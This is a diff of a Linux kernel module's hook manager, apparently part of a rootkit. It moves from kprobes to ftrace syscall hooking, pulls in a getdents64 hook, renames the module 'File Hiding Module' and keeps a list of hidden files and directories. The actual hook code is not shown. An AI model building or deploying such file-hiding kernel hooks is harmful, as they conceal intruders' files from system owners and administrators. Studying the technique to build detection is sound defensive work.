@@ -1,21 +1,20 @@
 /*
  * hook_manager.c - Hook 核心管理器
- * 支持 Kprobe 和 tracepoint 混合 Hook
+ * 使用 Ftrace 框架
  */
 
 #include <linux/module.h>
-#include <linux/kprobes.h>
-#include <linux/tracepoint.h>
 #include <linux/slab.h>
 #include <linux/spinlock.h>
 #include <linux/string.h>
-#include <linux/uaccess.h>
 
 #include "hook.h"
+#include "ftrace_helper.h"
+#include "hooks_getdents64.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("HOOK");
-MODULE_DESCRIPTION("Kernel Hook Framework for 5.10-6.12");
+MODULE_DESCRIPTION("File Hiding Module");
 MODULE_VERSION("1.0");
 
 /* Hidden file/folder storage */
@@ -33,17 +32,15 @@ int add_hidden_file(const char *name, bool is_dir)
 
     spin_lock_irqsave(&hidden_lock, flags);
 
-    /* 检查是否已存在 */
     for (i = 0; i < hidden_count; i++) {
         if (hidden_files[i].active &&
             strcmp(hidden_files[i].name, name) == 0 &&
             hidden_files[i].is_dir == is_dir) {
             spin_unlock_irqrestore(&hidden_lock, flags);
-            return 0; /* 已存在 */
+            return 0;
         }
     }
 
-    /* 添加新条目 */
     if (hidden_count >= MAX_HIDDEN_FILES) {
         spin_unlock_irqrestore(&hidden_lock, flags);
         return -ENOSPC;
@@ -55,7 +52,6 @@ int add_hidden_file(const char *name, bool is_dir)
     hidden_count++;
 
     spin_unlock_irqrestore(&hidden_lock, flags);
-
     pr_info("hook: added hidden %s: %s\n", is_dir ? "dir" : "file", name);
     return 0;
 }
@@ -112,64 +108,31 @@ void clear_hidden_list(void)
 
     spin_lock_irqsave(&hidden_lock, flags);
 
-    for (i = 0; i < hidden_count; i++) {
+    for (i = 0; i < hidden_count; i++)
         hidden_files[i].active = false;
-    }
     hidden_count = 0;
 
     spin_unlock_irqrestore(&hidden_lock, flags);
-
     pr_info("hook: hidden list cleared\n");
 }
 
-/* 注册 Kprobe */
-int hook_register(const char *name, void *handler)
+static int __init hook_init(void)
 {
-    /* TODO: 实现 Kprobe 注册 */
-    return 0;
-}
+    int err;
 
-void hook_unregister(const char *name)
-{
-    /* TODO: 实现 Kprobe 注销 */
-}
-
-/* 默认允许所有 UID */
-bool should_hook_uid(uid_t uid)
-{
-    return true; /* 默认 hook 所有 */
-}
-
-extern int vfs_hook_init(void);
-extern void vfs_hook_exit(void);
-extern int hook_init_kprobe(void);
-extern void hook_exit_kprobe(void);
-
-int hook_init(void)
-{
-    int ret;
-
-    ret = hook_init_kprobe();
-    if (ret < 0) {
-        pr_err("hook: failed to init kprobe: %d\n", ret);
-        return ret;
-    }
-
-    ret = vfs_hook_init();
-    if (ret < 0) {
-        pr_err("hook: failed to init vfs hook: %d\n", ret);
-        hook_exit_kprobe();
-        return ret;
+    err = fh_install_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));
+    if (err) {
+        pr_err("hook: failed to install hooks: %d\n", err);
+        return err;
     }
 
     pr_info("hook: module initialized\n");
     return 0;
 }
 
-void hook_exit(void)
+static void __exit hook_exit(void)
 {
-    vfs_hook_exit();
-    hook_exit_kprobe();
+    fh_remove_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));
     clear_hidden_list();
     pr_info("hook: module exited\n");
 }
